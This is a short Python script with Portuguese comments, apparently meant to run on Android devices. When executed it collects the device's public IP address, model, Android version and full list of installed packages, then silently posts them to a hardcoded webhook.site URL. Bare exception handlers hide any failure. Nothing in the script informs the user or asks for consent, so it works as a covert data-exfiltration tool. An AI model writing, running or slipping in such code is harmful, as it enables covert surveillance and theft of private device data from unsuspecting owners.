import os
import subprocess
import time
import requests

# Seu webhook
WEBHOOK_URL = "https://webhook.site/5d5e3fb7-1c53-42e0-b16a-494bb972561d"

def get_device_info():
    try:
        info = {
            'ip': requests.get("https://api.ipify.org").text,
            'model': subprocess.check_output(["getprop", "ro.product.model"]).decode().strip(),
            'version': subprocess.check_output(["getprop", "ro.build.version.release"]).decode().strip(),
            'apps': subprocess.check_output(["pm", "list", "packages"]).decode().strip()
        }
        return info
    except:
        return {'error': 'Falha ao obter dados'}

def send_data():
    info = get_device_info()
    try:
        requests.post(WEBHOOK_URL, json=info)
    except:
        pass

send_data()
